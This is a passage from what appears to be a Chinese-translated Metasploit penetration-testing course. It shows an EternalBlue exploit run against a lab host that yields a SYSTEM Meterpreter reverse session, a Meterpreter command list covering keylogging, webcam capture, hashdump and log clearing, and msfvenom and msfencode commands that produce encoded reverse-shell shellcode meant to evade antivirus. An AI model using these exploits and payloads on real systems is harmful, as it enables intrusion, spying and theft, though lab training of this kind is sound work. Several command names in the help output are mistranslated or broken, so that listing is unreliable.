class="line">[+] 10.10.10.40:445 - Target arch selected valid for arch indicated by DCE/RPC reply</span><br><span class="line">[*] 10.10.10.40:445 - Trying exploit with 12 Groom Allocations.</span><br><span class="line">[*] 10.10.10.40:445 - Sending all but last fragment of exploit packet</span><br><span class="line">[*] 10.10.10.40:445 - Starting non-paged pool grooming</span><br><span class="line">[+] 10.10.10.40:445 - Sending SMBv2 buffers</span><br><span class="line">[+] 10.10.10.40:445 - Closing SMBv1 connection creating free hole adjacent to SMBv2 buffer.</span><br><span class="line">[*] 10.10.10.40:445 - Sending final SMBv2 buffers.</span><br><span class="line">[*] 10.10.10.40:445 - Sending last fragment of exploit packet!</span><br><span class="line">[*] 10.10.10.40:445 - Receiving response from exploit packet</span><br><span class="line">[+] 10.10.10.40:445 - ETERNALBLUE overwrite completed successfully (0xC000000D)!</span><br><span class="line">[*] 10.10.10.40:445 - Sending egg to corrupted connection.</span><br><span class="line">[*] 10.10.10.40:445 - Triggering free of corrupted buffer.</span><br><span class="line">[*] Sending stage (201283 bytes) to 10.10.10.40</span><br><span class="line">[*] Meterpreter session 1 opened (10.10.14.15:4444 -&gt; 10.10.10.40:49158) at 2020-08-14 11:25:32 +0000</span><br><span class="line">[+] 10.10.10.40:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=</span><br><span class="line">[+] 10.10.10.40:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-WIN-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=</span><br><span class="line">[+] 10.10.10.40:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">meterpreter &gt; whoami</span><br><span class="line"></span><br><span class="line">[-] Unknown command: whoami.</span><br><span class="line"></span><br><span class="line">meterpreter &gt; getuid</span><br><span class="line"></span><br><span class="line">Server username: NT AUTHORITY\SYSTEM</span><br></pre></td></tr></table></figure><p>​该提示不是 Windows 命令行提示，而是<code>Meterpreter</code>提示符。通常用于 Windows 的命令<code>whoami</code>在这里不起作用。相反，我们可以使用 Linux 等效的<code>getuid</code>. 探索<code>help</code>菜单让我们更深入地了解 Meterpreter 有效载荷的能力。</p><h4 id="MSF-Meterpreter-命令"><a href="#MSF-Meterpreter-命令" class="headerlink" title="MSF - Meterpreter 命令"></a>MSF - Meterpreter 命令</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; help</span><br><span class="line"></span><br><span class="line">Core Commands</span><br><span class="line">=============</span><br><span class="line"></span><br><span class="line">    Command                   Description</span><br><span class="line">    -------                   -----------</span><br><span class="line">    ?                         Help menu</span><br><span class="line">    background                当前会话的背景</span><br><span class="line">    bg                        Alias for background</span><br><span class="line">    bgkill                    Kills a background meterpreter script</span><br><span class="line">    bglist                    Lists running background scripts</span><br><span class="line">    bgrun                     Executes a meterpreter script as a background thread</span><br><span class="line">    channel                   Displays information or control active channels</span><br><span class="line">    close                     Closes a channel</span><br><span class="line">    disable_unicode_encoding  Disables encoding of Unicode strings</span><br><span class="line">    enable_unicode_encoding   Enables encoding of Unicode strings</span><br><span class="line">    exit                      Terminate the meterpreter session</span><br><span class="line">    get_timeouts              Get the current session timeout values</span><br><span class="line">    guid                      Get the session GUID</span><br><span class="line">    help                      Help menu</span><br><span class="line">    info                      Displays information about a Post module</span><br><span class="line">    IRB                       Open an interactive Ruby shell on the current session</span><br><span class="line">    load                      Load one or more meterpreter extensions</span><br><span class="line">    machine_id                Get the MSF ID of the machine attached to the session</span><br><span class="line">    migrate                   Migrate the server to another process</span><br><span class="line">    pivot                     Manage pivot listeners</span><br><span class="line">    pry                       Open the Pry debugger on the current session</span><br><span class="line">    quit                      Terminate the meterpreter session</span><br><span class="line">    read                      Reads data from a channel</span><br><span class="line">    resource                  Run the commands stored in a file</span><br><span class="line">    run                       Executes a meterpreter script or Post module</span><br><span class="line">    secure                    (Re)Negotiate TLV packet encryption on the session</span><br><span class="line">    sessions                  Quickly switch to another session</span><br><span class="line">    set_timeouts              Set the current session timeout values</span><br><span class="line">    sleep                     Force Meterpreter to go quiet, then re-establish session.</span><br><span class="line">    transport                 Change the current transport mechanism</span><br><span class="line">    use                       Deprecated alias for &quot;load&quot;</span><br><span class="line">    uuid                      Get the UUID for the current session</span><br><span class="line">    write                     Writes data to a channel</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Strap: File system Commands</span><br><span class="line">============================</span><br><span class="line"></span><br><span class="line">    Command       Description</span><br><span class="line">    -------       -----------</span><br><span class="line">    cat           Read the contents of a file to the screen</span><br><span class="line">    cd            Change directory</span><br><span class="line">    checksum      Retrieve the checksum of a file</span><br><span class="line">    cp            Copy source to destination</span><br><span class="line">    dir           List files (alias for ls)</span><br><span class="line">    download      Download a file or directory</span><br><span class="line">    edit          Edit a file</span><br><span class="line">    getlwd        Print local working directory</span><br><span class="line">    getwd         Print working directory</span><br><span class="line">    LCD           Change local working directory</span><br><span class="line">    lls           List local files</span><br><span class="line">    lpwd          Print local working directory</span><br><span class="line">    ls            List files</span><br><span class="line">    mkdir         Make directory</span><br><span class="line">    mv            Move source to destination</span><br><span class="line">    PWD           Print working directory</span><br><span class="line">    rm            Delete the specified file</span><br><span class="line">    rmdir         Remove directory</span><br><span class="line">    search        Search for files</span><br><span class="line">    show_mount    List all mount points/logical drives</span><br><span class="line">    upload        Upload a file or directory</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Strap: Networking Commands</span><br><span class="line">===========================</span><br><span class="line"></span><br><span class="line">    Command       Description</span><br><span class="line">    -------       -----------</span><br><span class="line">    arp           Display the host ARP cache</span><br><span class="line">    get proxy      Display the current proxy configuration</span><br><span class="line">    ifconfig      Display interfaces</span><br><span class="line">    ipconfig      Display interfaces</span><br><span class="line">    netstat       Display the network connections</span><br><span class="line">    portfwd       Forward a local port to a remote service</span><br><span class="line">    resolve       Resolve a set of hostnames on the target</span><br><span class="line">    route         View and modify the routing table</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Strap: System Commands</span><br><span class="line">=======================</span><br><span class="line"></span><br><span class="line">    Command       Description</span><br><span class="line">    -------       -----------</span><br><span class="line">    clearev       Clear the event log</span><br><span class="line">    drop_token    Relinquishes any active impersonation token.</span><br><span class="line">    execute       Execute a command</span><br><span class="line">    getenv        Get one or more environment variable values</span><br><span class="line">    getpid        Get the current process identifier</span><br><span class="line">    getprivs      Attempt to enable all privileges available to the current process</span><br><span class="line">    getsid        Get the SID of the user that the server is running as</span><br><span class="line">    getuid        Get the user that the server is running as</span><br><span class="line">    kill          Terminate a process</span><br><span class="line">    localtime     Displays the target system&#x27;s local date and time</span><br><span class="line">    pgrep         Filter processes by name</span><br><span class="line">    pkill         Terminate processes by name</span><br><span class="line">    ps            List running processes</span><br><span class="line">    reboot        Reboots the remote computer</span><br><span class="line">    reg           Modify and interact with the remote registry</span><br><span class="line">    rev2self      Calls RevertToSelf() on the remote machine</span><br><span class="line">    shell         Drop into a system command shell</span><br><span class="line">    shutdown      Shuts down the remote computer</span><br><span class="line">    steal_token   Attempts to steal an impersonation token from the target process</span><br><span class="line">    suspend       Suspends or resumes a list of processes</span><br><span class="line">    sysinfo       Gets information about the remote system, such as OS</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Strap: User interface Commands</span><br><span class="line">===============================</span><br><span class="line"></span><br><span class="line">    Command        Description</span><br><span class="line">    -------        -----------</span><br><span class="line">    enumdesktops   List all accessible desktops and window stations</span><br><span class="line">    getdesktop     Get the current meterpreter desktop</span><br><span class="line">    idle time       Returns the number of seconds the remote user has been idle</span><br><span class="line">    keyboard_send  Send keystrokes</span><br><span class="line">    keyevent       Send key events</span><br><span class="line">    keyscan_dump   Dump the keystroke buffer</span><br><span class="line">    keyscan_start  Start capturing keystrokes</span><br><span class="line">    keyscan_stop   Stop capturing keystrokes</span><br><span class="line">    mouse          Send mouse events</span><br><span class="line">    screenshare    Watch the remote user&#x27;s desktop in real-time</span><br><span class="line">    screenshot     Grab a screenshot of the interactive desktop</span><br><span class="line">    setdesktop     Change the meterpreters current desktop</span><br><span class="line">    uictl          Control some of the user interface components</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Stdapi: Webcam Commands</span><br><span class="line">=======================</span><br><span class="line"></span><br><span class="line">    Command        Description</span><br><span class="line">    -------        -----------</span><br><span class="line">    record_mic     Record audio from the default microphone for X seconds</span><br><span class="line">    webcam_chat    Start a video chat</span><br><span class="line">    webcam_list    List webcams</span><br><span class="line">    webcam_snap    Take a snapshot from the specified webcam</span><br><span class="line">    webcam_stream  Play a video stream from the specified webcam</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Strap: Audio Output Commands</span><br><span class="line">=============================</span><br><span class="line"></span><br><span class="line">    Command       Description</span><br><span class="line">    -------       -----------</span><br><span class="line">    play          play a waveform audio file (.wav) on the target system</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Priv: Elevate Commands</span><br><span class="line">======================</span><br><span class="line"></span><br><span class="line">    Command       Description</span><br><span class="line">    -------       -----------</span><br><span class="line">    get system     Attempt to elevate your privilege to that of the local system.</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Priv: Password database Commands</span><br><span class="line">================================</span><br><span class="line"></span><br><span class="line">    Command       Description</span><br><span class="line">    -------       -----------</span><br><span class="line">    hashdump      Dumps the contents of the SAM database</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Priv: Timestamp Commands</span><br><span class="line">========================</span><br><span class="line"></span><br><span class="line">    Command       Description</span><br><span class="line">    -------       -----------</span><br><span class="line">    timestamp     Manipulate file MACE attributes</span><br></pre></td></tr></table></figure><p>很漂亮。从从 SAM 中提取用户哈希值到截取屏幕截图和激活网络摄像头。所有这些都是通过 Linux 风格的命令行轻松完成的。进一步探索，我们还看到了打开 shell 通道的选项。这将使我们进入实际的 Windows 命令行界面。</p><h4 id="MSF-Meterpreter-导航"><a href="#MSF-Meterpreter-导航" class="headerlink" title="MSF - Meterpreter 导航"></a>MSF - Meterpreter 导航</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; cd Users</span><br><span class="line">meterpreter &gt; ls</span><br><span class="line"></span><br><span class="line">Listing: C:\Users</span><br><span class="line">=================</span><br><span class="line"></span><br><span class="line">Mode              Size  Type  Last modified              Name</span><br><span class="line">----              ----  ----  -------------              ----</span><br><span class="line">40777/rwxrwxrwx   8192  dir   2017-07-21 06:56:23 +0000  Administrator</span><br><span class="line">40777/rwxrwxrwx   0     dir   2009-07-14 05:08:56 +0000  All Users</span><br><span class="line">40555/r-xr-xr-x   8192  dir   2009-07-14 03:20:08 +0000  Default</span><br><span class="line">40777/rwxrwxrwx   0     dir   2009-07-14 05:08:56 +0000  Default User</span><br><span class="line">40555/r-xr-xr-x   4096  dir   2009-07-14 03:20:08 +0000  Public</span><br><span class="line">100666/rw-rw-rw-  174   fil   2009-07-14 04:54:24 +0000  desktop.ini</span><br><span class="line">40777/rwxrwxrwx   8192  dir   2017-07-14 13:45:33 +0000  haris</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">meterpreter &gt; shell</span><br><span class="line"></span><br><span class="line">Process 2664 created.</span><br><span class="line">Channel 1 created.</span><br><span class="line"></span><br><span class="line">Microsoft Windows [Version 6.1.7601]</span><br><span class="line">Copyright (c) 2009 Microsoft Corporation. All rights reserved.</span><br><span class="line"></span><br><span class="line">C:\Users&gt;</span><br></pre></td></tr></table></figure><p><code>Channel 1</code>已创建，我们将自动放入此机器的 CLI 中。这里的通道表示我们的设备和目标主机之间的连接，它已经使用 Meterpreter Stager 和 Stage 在反向 TCP 连接（从目标主机到我们）中建立。stager 在我们的机器上被激活，以等待由目标机器上的 Stage 有效负载初始化的连接请求。</p><p>在某些情况下，进入目标的标准 shell 是有帮助的，但 Meterpreter 也可以在受害机器上导航和执行操作。所以我们看到命令发生了变化，但我们在系统内具有相同的权限级别。</p><h4 id="MSF-Windows-CMD"><a href="#MSF-Windows-CMD" class="headerlink" title="MSF-Windows CMD"></a>MSF-Windows CMD</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">Microsoft Windows [Version 6.1.7601]</span><br><span class="line">Copyright (c) 2009 Microsoft Corporation. All rights reserved.</span><br><span class="line"></span><br><span class="line">C:\Users&gt;dir</span><br><span class="line"></span><br><span class="line">dir</span><br><span class="line"> Volume in drive C has no label.</span><br><span class="line"> Volume Serial Number is A0EF-1911</span><br><span class="line"></span><br><span class="line"> Directory of C:\Users</span><br><span class="line"></span><br><span class="line">21/07/2017  07:56    &lt;DIR&gt;          .</span><br><span class="line">21/07/2017  07:56    &lt;DIR&gt;          ..</span><br><span class="line">21/07/2017  07:56    &lt;DIR&gt;          Administrator</span><br><span class="line">14/07/2017  14:45    &lt;DIR&gt;          haris</span><br><span class="line">12/04/2011  08:51    &lt;DIR&gt;          Public</span><br><span class="line">               0 File(s)              0 bytes</span><br><span class="line">               5 Dir(s)  15,738,978,304 bytes free</span><br><span class="line"></span><br><span class="line">C:\Users&gt;whoami</span><br><span class="line"></span><br><span class="line">whoami</span><br><span class="line">nt authority\system</span><br></pre></td></tr></table></figure><p>让我们看看我们可以使用哪些其他类型的有效载荷。我们将研究与 Windows 操作系统相关的最常见的问题。</p><h2 id="有效载荷类型"><a href="#有效载荷类型" class="headerlink" title="有效载荷类型"></a>有效载荷类型</h2><p>下表包含用于 Windows 机器的最常见有效负载及其各自的描述。</p><table><thead><tr><th><strong>有效载荷</strong></th><th><strong>描述</strong></th></tr></thead><tbody><tr><td><code>generic/custom</code></td><td>通用监听器，多用途</td></tr><tr><td><code>generic/shell_bind_tcp</code></td><td>通用监听器，多用途，普通 shell，TCP 连接绑定</td></tr><tr><td><code>generic/shell_reverse_tcp</code></td><td>通用侦听器，多用途，普通外壳，反向 TCP 连接</td></tr><tr><td><code>windows/x64/exec</code></td><td>执行任意命令 (Windows x64)</td></tr><tr><td><code>windows/x64/loadlibrary</code></td><td>加载任意 x64 库路径</td></tr><tr><td><code>windows/x64/messagebox</code></td><td>使用可自定义的标题、文本和图标通过 MessageBox 生成一个对话框</td></tr><tr><td><code>windows/x64/shell_reverse_tcp</code></td><td>普通 shell，单一负载，反向 TCP 连接</td></tr><tr><td><code>windows/x64/shell/reverse_tcp</code></td><td>普通shell，stager + stage，反向TCP连接</td></tr><tr><td><code>windows/x64/shell/bind_ipv6_tcp</code></td><td>普通外壳，stager + stage，IPv6 Bind TCP stager</td></tr><tr><td><code>windows/x64/meterpreter/$</code></td><td>Meterpreter payload + 以上变体</td></tr><tr><td><code>windows/x64/powershell/$</code></td><td>交互式 PowerShell 会话 + 以上品种</td></tr><tr><td><code>windows/x64/vncinject/$</code></td><td>VNC 服务器（反射注入）+ 以上品种</td></tr></tbody></table><p>渗透测试人员在安全评估期间大量使用的其他关键有效载荷是 Empire 和 Cobalt Strike 有效载荷。这些不在本课程的范围内，但您可以在我们的空闲时间随意研究它们，因为它们可以提供大量关于专业渗透测试人员如何对高价值目标进行评估的见解。</p><p>当然，除了这些之外，还有许多其他有效载荷。有些是针对特定设备供应商的，例如 Cisco、Apple 或 PLC。有些我们可以使用<code>msfvenom</code>. 然而，接下来，我们将研究<code>Targets</code>以及如何使用它们来影响攻击结果。</p><h1 id="编码器"><a href="#编码器" class="headerlink" title="编码器"></a>编码器</h1><hr><p>在 Metasploit 框架存在的 15 年中，<code>Encoders</code>它帮助使有效负载与不同的处理器架构兼容，同时帮助逃避防病毒。<code>Encoders</code>发挥改变有效载荷以在不同操作系统和体系结构上运行的作用。这些架构包括：</p><table><thead><tr><th><code>x64</code></th><th><code>x86</code></th><th><code>sparc</code></th><th><code>ppc</code></th><th><code>mips</code></th></tr></thead><tbody><tr><td></td><td></td><td></td><td></td><td></td></tr></tbody></table><p><code>bad characters</code>还需要它们从有效负载中删除已知的十六进制操作码。不仅如此，以不同格式编码有效载荷也有助于如上所述的反病毒检测。然而，随着 IPS&#x2F;IDS 制造商改进了他们的保护软件处理恶意软件和病毒签名的方式，严格用于 AV 规避的编码器的使用随着时间的推移已经减少。</p><p>Shikata Ga Nai ( <code>SGN</code>) 是当今最常用的编码方案之一，因为它很难检测到通过其机制编码的有效载荷不再普遍无法检测到。离得很远。名称 ( <code>仕方がない</code>) 的意思是<code>It cannot be helped</code>or <code>Nothing can be done about it</code>，如果我们几年前读到这篇文章的话，这是理所当然的。但是，我们将探索其他方法来规避保护系统。<a href="https://www.fireeye.com/blog/threat-research/2019/10/shikata-ga-nai-encoder-still-going-strong.html">来自 FireEye 的这篇文章</a>详细介绍了 Shikata Ga Nai 之前统治其他编码器的原因和方式。</p><hr><h2 id="选择编码器"><a href="#选择编码器" class="headerlink" title="选择编码器"></a>选择编码器</h2><p>在 2015 年之前，Metasploit 框架有不同的子模块来处理负载和编码器。它们与 msfconsole 脚本分开打包，并称为<code>msfpayload</code>and <code>msfencode</code>。这两个工具位于<code>/usr/share/framework2/</code>.</p><p>如果我们想创建我们的自定义负载，我们可以通过 来实现<code>msfpayload</code>，但我们必须根据目标操作系统架构对其进行编码，<code>msfencode</code>然后再使用。管道将从一个命令获取输出并将其馈送到下一个命令，这将生成一个编码的有效负载，准备好发送并在目标机器上运行。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">vnswer77@htb[/htb]$ msfpayload windows/shell_reverse_tcp LHOST=127.0.0.1 LPORT=4444 R | msfencode -b &#x27;\x00&#x27; -f perl -e x86/shikata_ga_nai</span><br><span class="line"></span><br><span class="line">[*] x86/shikata_ga_nai succeeded with size 1636 (iteration=1)</span><br><span class="line"></span><br><span class="line">my $buf = </span><br><span class="line">&quot;\xbe\x7b\xe6\xcd\x7c\xd9\xf6\xd9\x74\x24\xf4\x58\x2b\xc9&quot; .</span><br><span class="line">&quot;\x66\xb9\x92\x01\x31\x70\x17\x83\xc0\x04\x03\x70\x13\xe2&quot; .</span><br><span class="line">&quot;\x8e\xc9\xe7\x76\x50\x3c\xd8\xf1\xf9\x2e\x7c\x91\x8e\xdd&quot; .</span><br><span class="line">&quot;\x53\x1e\x18\x47\xc0\x8c\x87\xf5\x7d\x3b\x52\x88\x0e\xa6&quot; .</span><br><span class="line">&quot;\xc3\x18\x92\x58\xdb\xcd\x74\xaa\x2a\x3a\x55\xae\x35\x36&quot; .</span><br><span class="line">&quot;\xf0\x5d\xcf\x96\xd0\x81\xa7\xa2\x50\xb2\x0d\x64\xb6\x45&quot; .</span><br><span class="line">&quot;\x06\x0d\xe6\xc4\x8d\x85\x97\x65\x3d\x0a\x37\xe3\xc9\xfc&quot; .</span><br><span class="line">&quot;\xa4\x9c\x5c\x0b\x0b\x49\xbe\x5d\x0e\xdf\xfc\x2e\xc3\x9a&quot; .</span><br><span class="line">&quot;\x3d\xd7\x82\x48\x4e\x72\x69\xb1\xfc\x34\x3e\xe2\xa8\xf9&quot; .</span><br><span class="line">&quot;\xf1\x36\x67\x2c\xc2\x18\xb7\x1e\x13\x49\x97\x12\x03\xde&quot; .</span><br><span class="line">&quot;\x85\xfe\x9e\xd4\x1d\xcb\xd4\x38\x7d\x39\x35\x6b\x5d\x6f&quot; .</span><br><span class="line">&quot;\x50\x1d\xf8\xfd\xe9\x84\x41\x6d\x60\x29\x20\x12\x08\xe7&quot; .</span><br><span class="line">&quot;\xcf\xa0\x82\x6e\x6a\x3a\x5e\x44\x58\x9c\xf2\xc3\xd6\xb9&quot; .</span><br><span class="line"></span><br><span class="line">&lt;SNIP&gt;</span><br></pre></td></tr></table></figure><p>2015 年之后，这些脚本的更新已将它们合并到<code>msfvenom</code>工具中，该工具负责有效负载生成和编码。<code>msfvenom</code>后面我们会详细讲到。下面是今天的有效负载生成的示例<code>msfvenom</code>：</p><h4 id="生成有效载荷-无编码"><a href="#生成有效载荷-无编码" class="headerlink" title="生成有效载荷 - 无编码"></a>生成有效载荷 - 无编码</h4><p> 生成有效载荷 - 无编码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">vnswer77@htb[/htb]$ msfvenom -a x86 --platform windows -p windows/shell/reverse_tcp LHOST=127.0.0.1 LPORT=4444 -b &quot;\x00&quot; -f perl</span><br><span class="line"></span><br><span class="line">Found 11 compatible encoders</span><br><span class="line">Attempting to encode payload with 1 iterations of x86/shikata_ga_nai</span><br><span class="line">x86/shikata_ga_nai succeeded with size 381 (iteration=0)</span><br><span class="line">x86/shikata_ga_nai chosen with final size 381</span><br><span class="line">Payload size: 381 bytes</span><br><span class="line">Final size of perl file: 1674 bytes</span><br><span class="line">my $buf = </span><br><span class="line">&quot;\xda\xc1\xba\x37\xc7\xcb\x5e\xd9\x74\x24\xf4\x5b\x2b\xc9&quot; .</span><br><span class="line">&quot;\xb1\x59\x83\xeb\xfc\x31\x53\x15\x03\x53\x15\xd5\x32\x37&quot; .</span><br><span class="line">&quot;\xb6\x96\xbd\xc8\x47\xc8\x8c\x1a\x23\x83\xbd\xaa\x27\xc1&quot; .</span><br><span class="line">&quot;\x4d\x42\xd2\x6e\x1f\x40\x2c\x8f\x2b\x1a\x66\x60\x9b\x91&quot; .</span><br><span class="line">&quot;\x50\x4f\x23\x89\xa1\xce\xdf\xd0\xf5\x30\xe1\x1a\x08\x31&quot; .</span><br><span class="line"></span><br><span class="line">&lt;SNIP&gt;</span><br></pre></td></tr></table></figure><p>我们现在应该看一下的第一行<code>$buf</code>，看看它在应用像 . 这样的编码器时是如何变化的<code>shikata_ga_nai</code>。</p><h4 id="生成有效载荷-使用编码"><a href="#生成有效载荷-使用编码" class="headerlink" title="生成有效载荷 - 使用编码"></a>生成有效载荷 - 使用编码</h4><p> 生成有效载荷 - 使用编码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">vnswer77@htb[/htb]$ msfvenom -a x86 --platform windows -p windows/shell/reverse_tcp LHOST=127.0.0.1 LPORT=4444 -b &quot;\x00&quot; -f perl -e x86/shikata_ga_nai</span><br><span class="line"></span><br><span class="line">Found 1 compatible encoders</span><br><span class="line">Attempting to encode payload with 3 iterations of x86/shikata_ga_nai</span><br><span class="line">x86/shikata_ga_nai succeeded with size 326 (iteration=0)</span><br><span class="line">x86/shikata_ga_nai succeeded with size 353 (iteration=1)</span><br><span class="line">x86/shikata_ga_nai succeeded with size 380 (iteration=2)</span><br><span class="line">x86/shikata_ga_nai chosen with final size 380</span><br><span class="line">Payload size: 380 bytes</span><br><span class="line">buf = &quot;&quot;</span><br><span class="line">buf += &quot;\xbb\x78\xd0\x11\xe9\xda\xd8\xd9\x74\x24\xf4\x58\x31&quot;</span><br><span class="line">buf += &quot;\xc9\xb1\x59\x31\x58\x13\x83\xc0\x04\x03\x58\x77\x32&quot;</span><br><span class="line">buf += &quot;\xe4\x53\x15\x11\xea\xff\xc0\x91\x2c\x8b\xd6\xe9\x94&quot;</span><br><span class="line">buf += &quot;\x47\xdf\xa3\x79\x2b\x1c\xc7\x4c\x78\xb2\xcb\xfd\x6e&quot;</span><br><span class="line">buf += &quot;\xc2\x9d\x53\x59\xa6\x37\xc3\x57\x11\xc8\x77\x77\x9e&quot;</span><br><span class="line"></span><br><span class="line">&lt;SNIP&gt;</span><br></pre></td></tr></table></figure><p>如果我们想查看<code>shikata_ga_nai</code>编码器的功能，我们可以查看<a href="https://hatching.io/blog/metasploit-payloads2/">此处的</a>精彩帖子。</p><p>假设我们要为<code>existing payload</code>. 